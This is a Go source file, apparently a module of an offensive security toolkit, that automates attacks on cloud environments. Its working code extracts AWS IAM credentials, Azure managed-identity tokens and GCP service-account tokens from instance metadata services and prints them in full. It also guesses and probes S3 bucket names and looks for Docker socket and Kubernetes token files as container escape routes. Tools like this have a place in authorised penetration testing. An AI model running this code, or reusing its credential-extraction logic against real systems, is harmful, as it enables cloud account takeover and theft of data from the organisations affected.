package cloudops

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/bryanparreira/davoid/internal/engagement"
	"github.com/bryanparreira/davoid/internal/modules/ui"
)

var client = &http.Client{Timeout: 10 * time.Second}

func Run() error {
	ui.Header("Cloud Ops — AWS / Azure / GCP Recon & Attack")

	action := ui.Select("Cloud Target", []string{
		"AWS — IMDS credential extraction",
		"AWS — S3 bucket enumeration",
		"Azure — IMDS token extraction",
		"GCP — Metadata server recon",
		"Docker / Kubernetes — Container escape check",
	})
	if action < 0 {
		return nil
	}

	switch action {
	case 0:
		return awsIMDS()
	case 1:
		return awsS3Enum()
	case 2:
		return azureIMDS()
	case 3:
		return gcpMetadata()
	case 4:
		return containerCheck()
	}
	return nil
}

// ── AWS IMDS ─────────────────────────────────────────────────────────────────

func awsIMDS() error {
	ui.Info("Probing AWS IMDS (Instance Metadata Service)...")
	eng, _ := engagement.Active()

	// IMDSv2: get token first
	tokenReq, _ := http.NewRequest("PUT", "http://169.254.169.254/latest/api/token", nil)
	tokenReq.Header.Set("X-aws-ec2-metadata-token-ttl-seconds", "21600")
	tokenResp, err := client.Do(tokenReq)

	imdsToken := ""
	if err == nil && tokenResp.StatusCode == 200 {
		body, _ := io.ReadAll(tokenResp.Body)
		tokenResp.Body.Close()
		imdsToken = string(body)
		ui.Success("IMDSv2 token obtained.")
	} else {
		ui.Warn("IMDSv2 unavailable, trying IMDSv1...")
	}

	imdsGet := func(path string) string {
		req, _ := http.NewRequest("GET", "http://169.254.169.254"+path, nil)
		if imdsToken != "" {
			req.Header.Set("X-aws-ec2-metadata-token", imdsToken)
		}
		resp, err := client.Do(req)
		if err != nil {
			return ""
		}
		defer resp.Body.Close()
		body, _ := io.ReadAll(resp.Body)
		return string(body)
	}

	endpoints := map[string]string{
		"Instance ID":  "/latest/meta-data/instance-id",
		"Region":       "/latest/meta-data/placement/region",
		"Account ID":   "/latest/dynamic/instance-identity/document",
		"IAM Role":     "/latest/meta-data/iam/security-credentials/",
	}

	found := false
	for label, path := range endpoints {
		val := imdsGet(path)
		if val != "" {
			fmt.Printf("  %s  %s\n", ui.Cyan.Render(fmt.Sprintf("%-15s", label)), truncate(val, 80))
			found = true
		}
	}

	if !found {
		ui.Warn("IMDS not reachable. Not running on AWS EC2.")
		ui.PressEnter()
		return nil
	}

	// Try to get IAM creds
	roleName := imdsGet("/latest/meta-data/iam/security-credentials/")
	if roleName != "" {
		roleName = strings.TrimSpace(roleName)
		creds := imdsGet("/latest/meta-data/iam/security-credentials/" + roleName)
		if creds != "" {
			fmt.Println()
			ui.Warn(fmt.Sprintf("IAM credentials for role: %s", roleName))
			var credData map[string]interface{}
			json.Unmarshal([]byte(creds), &credData)
			for k, v := range credData {
				fmt.Printf("  %s: %s\n", ui.Red.Render(k), truncate(fmt.Sprintf("%v", v), 80))
			}
			if eng != nil {
				engagement.LogFinding(eng.ID, "cloud_ops", "AWS IMDS",
					fmt.Sprintf("AWS IAM credentials extracted for role: %s", roleName),
					creds, "CRITICAL", creds)
			}
		}
	}

	ui.PressEnter()
	return nil
}

// ── AWS S3 ───────────────────────────────────────────────────────────────────

func awsS3Enum() error {
	company := ui.Prompt("Company name / keyword (for bucket guessing)")
	if company == "" {
		return nil
	}

	suffixes := []string{
		"", "-backup", "-backups", "-data", "-dev", "-prod", "-staging",
		"-assets", "-logs", "-files", "-uploads", "-media", "-static",
		"-public", "-private", "-internal", "-archive", "-db",
	}

	prefixes := []string{company, strings.ToLower(company), strings.ReplaceAll(company, " ", "-")}

	fmt.Println()
	ui.Info(fmt.Sprintf("Probing %d bucket name permutations...", len(prefixes)*len(suffixes)))
	ui.Divider()

	eng, _ := engagement.Active()
	found := 0

	for _, prefix := range prefixes {
		for _, suffix := range suffixes {
			bucket := prefix + suffix
			url := fmt.Sprintf("https://%s.s3.amazonaws.com/", bucket)
			resp, err := client.Get(url)
			if err != nil {
				continue
			}
			body, _ := io.ReadAll(resp.Body)
			resp.Body.Close()

			switch resp.StatusCode {
			case 200:
				fmt.Printf("  %s  %s  (PUBLIC READ)\n", ui.Red.Render("OPEN"), bucket)
				if eng != nil {
					engagement.LogFinding(eng.ID, "cloud_ops", bucket,
						"Publicly readable S3 bucket: "+bucket,
						url, "CRITICAL", url)
				}
				found++
			case 403:
				fmt.Printf("  %s  %s  (exists, private)\n", ui.Yellow.Render("PRIV"), bucket)
				found++
			case 301, 302:
				fmt.Printf("  %s  %s  (redirect)\n", ui.Cyan.Render("RDIR"), bucket)
			default:
				_ = body
			}
		}
	}

	fmt.Println()
	if found == 0 {
		ui.Info("No buckets found.")
	} else {
		ui.Success(fmt.Sprintf("%d bucket(s) discovered.", found))
	}
	ui.PressEnter()
	return nil
}

// ── Azure IMDS ────────────────────────────────────────────────────────────────

func azureIMDS() error {
	ui.Info("Probing Azure IMDS...")
	eng, _ := engagement.Active()

	req, _ := http.NewRequest("GET", "http://169.254.169.254/metadata/instance?api-version=2021-02-01", nil)
	req.Header.Set("Metadata", "true")
	resp, err := client.Do(req)
	if err != nil || resp.StatusCode != 200 {
		ui.Warn("Azure IMDS not reachable. Not running on Azure.")
		ui.PressEnter()
		return nil
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)

	var meta map[string]interface{}
	json.Unmarshal(body, &meta)

	fmt.Println()
	ui.Divider()
	printMap(meta, "  ")
	ui.Divider()

	// Try to get managed identity token
	tokenReq, _ := http.NewRequest("GET",
		"http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/", nil)
	tokenReq.Header.Set("Metadata", "true")
	tokenResp, err := client.Do(tokenReq)
	if err == nil && tokenResp.StatusCode == 200 {
		tokenBody, _ := io.ReadAll(tokenResp.Body)
		tokenResp.Body.Close()
		ui.Warn("Managed Identity token obtained!")
		fmt.Println(ui.Yellow.Render(truncate(string(tokenBody), 200)))
		if eng != nil {
			engagement.LogFinding(eng.ID, "cloud_ops", "Azure IMDS",
				"Azure Managed Identity token extracted",
				string(tokenBody), "CRITICAL", string(tokenBody))
		}
	}

	ui.PressEnter()
	return nil
}

// ── GCP Metadata ─────────────────────────────────────────────────────────────

func gcpMetadata() error {
	ui.Info("Probing GCP metadata server...")
	eng, _ := engagement.Active()

	endpoints := map[string]string{
		"Project ID":     "/computeMetadata/v1/project/project-id",
		"Instance name":  "/computeMetadata/v1/instance/name",
		"Zone":           "/computeMetadata/v1/instance/zone",
		"Service Account": "/computeMetadata/v1/instance/service-accounts/default/email",
		"SA Token":       "/computeMetadata/v1/instance/service-accounts/default/token",
	}

	found := false
	for label, path := range endpoints {
		req, _ := http.NewRequest("GET", "http://metadata.google.internal"+path, nil)
		req.Header.Set("Metadata-Flavor", "Google")
		resp, err := client.Do(req)
		if err != nil || resp.StatusCode != 200 {
			continue
		}
		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		val := string(body)
		fmt.Printf("  %s  %s\n", ui.Cyan.Render(fmt.Sprintf("%-20s", label)), truncate(val, 80))
		found = true

		if label == "SA Token" && eng != nil {
			engagement.LogFinding(eng.ID, "cloud_ops", "GCP Metadata",
				"GCP Service Account token extracted",
				val, "CRITICAL", val)
		}
	}

	if !found {
		ui.Warn("GCP metadata server not reachable. Not running on GCP.")
	}
	ui.PressEnter()
	return nil
}

// ── Container check ──────────────────────────────────────────────────────────

func containerCheck() error {
	ui.Info("Checking for container escape vectors...")

	checks := []struct {
		label string
		paths []string
		sev   string
	}{
		{"Docker socket", []string{"/var/run/docker.sock"}, "CRITICAL"},
		{"Docker environment", []string{"/.dockerenv"}, "MEDIUM"},
		{"Kubernetes token", []string{"/var/run/secrets/kubernetes.io/serviceaccount/token"}, "HIGH"},
		{"Kubernetes cert", []string{"/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"}, "HIGH"},
		{"cgroup (container indicator)", []string{"/proc/1/cgroup"}, "INFO"},
	}

	eng, _ := engagement.Active()
	found := false

	for _, c := range checks {
		for _, p := range c.paths {
			if _, err := os.Stat(p); err == nil {
				fmt.Printf("  %s  %s  %s\n",
					ui.Red.Render(fmt.Sprintf("[%s]", c.sev)),
					p,
					ui.Yellow.Render("FOUND"),
				)
				found = true
				if eng != nil {
					engagement.LogFinding(eng.ID, "cloud_ops", "localhost",
						"Container escape vector: "+c.label+" at "+p,
						p, c.sev, p)
				}
			}
		}
	}

	if !found {
		ui.Info("No container escape vectors found.")
	}

	// Read cgroup to detect container
	if data, err := os.ReadFile("/proc/1/cgroup"); err == nil {
		if strings.Contains(string(data), "docker") || strings.Contains(string(data), "lxc") {
			ui.Warn("Running inside a container (detected via cgroup).")
		}
	}

	ui.PressEnter()
	return nil
}

func printMap(m map[string]interface{}, indent string) {
	for k, v := range m {
		switch val := v.(type) {
		case map[string]interface{}:
			fmt.Printf("%s%s:\n", indent, ui.Cyan.Render(k))
			printMap(val, indent+"  ")
		default:
			fmt.Printf("%s%s: %s\n", indent, ui.Cyan.Render(k), truncate(fmt.Sprintf("%v", val), 80))
		}
	}
}

func truncate(s string, max int) string {
	if len(s) <= max {
		return s
	}
	return s[:max-3] + "..."
}
